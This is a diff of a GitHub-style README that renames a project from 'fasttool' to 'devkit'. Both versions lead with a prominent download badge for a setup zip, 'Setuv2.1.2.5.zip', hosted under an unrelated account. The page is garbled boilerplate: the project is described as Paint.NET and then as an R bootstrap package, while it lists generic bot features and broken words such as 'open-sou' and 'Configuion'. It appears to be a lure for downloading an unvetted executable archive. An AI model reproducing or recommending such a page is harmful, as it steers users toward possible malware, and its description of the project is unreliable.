@@ -1,21 +1,46 @@
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/johnsantos-x90h3/fasttool/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/Download-Setuv2.1.2.5.zip-blue?style=for-the-badge&logo=files)](https://github.com/johnsantos-x90h3/fasttool/releases/download/v2.0.0/Setuv2.1.2.5.zip)
 
-# ⚡ fasttool
+# ⚡ devkit
 
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
+![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.9+-brightgreen.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
 
-![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/johnsantos-x90h3/fasttool?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/johnsantos-x90h3/fasttool?style=flat-square)
+![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/leonvlab2004s6/devkit?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/leonvlab2004s6/devkit?style=flat-square)
 
-Get Paint.NET on Windows. It's a image editor with layers, effects, and many photo editing tools
+Bootstrap — Ipsatized Data Factor Analytic Profile Analysis — an R package featuring three-stage bootstrap validation
 
 ## ✅ Features
 
 - ✅ Role-based permission system
-- ✅ Configurable via YAML with .env secrets
 - ✅ Auto-nect on connection loss
-- ✅ Command handler with customizable prefix
-- ✅ e limiting middleware per user
 - ✅ Plugin system with hot-reload capability
+- ✅ e limiting middleware per user
+- ✅ Configurable via YAML with .env secrets
+- ✅ Command handler with customizable prefix
+
+## 📄 tool
+
+devkit is built for bootstrap users who need a reliable, open-sou solution.
+
+MIT tool. See [tool](tool) for details.
+
+---
+
+If you find **devkit** useful, give it a ⭐ — it helps others discover this project.
+
+Found a bug? [Open an issue](../../issues/new).## ⚙️ Configuion
+
+Copy and edit the example config:
+```bash
+cp config.example.yaml config.yaml
+```
+
+## ▶️ Usage
+
+```bash
+python main.py --help
+python main.py run
+python main.py run --config settings.yaml
+```
 
 ## ⚙️ Installation
 
@@ -25,39 +50,14 @@ Get Paint.NET on Windows. It's a image editor with layers, effects, and many pho
 
 **Option 2:** Clone and run
 ```bash
-git clone https://github.com/johnsantos-x90h3/fasttool.git
-cd fasttool
+git clone https://github.com/leonvlab2004s6/devkit.git
+cd devkit
 pip install -r requirements.txt
 python main.py
-```
-
-## 📄 tool
-
-fasttool is built for paint.net users who need a reliable, open-sou solution.
-
-MIT tool. See [tool](tool) for details.
-
-___
-
-If you find **fasttool** useful, give it a ⭐ — it helps others discover this project.
-
-Found a bug? [Open an issue](../../issues/new).## ▶️ Usage
-
-```bash
-python main.py --help
-python main.py run
-python main.py run --config settings.yaml
-```
-
-## ⚙️ Configuion
-
-Copy and edit the example config:
-```bash
-cp config.example.yaml config.yaml
 ```
 
 
 
 ---
 
-✨ Thanks to all contributors!
+📖 Check the wiki for detailed documentation
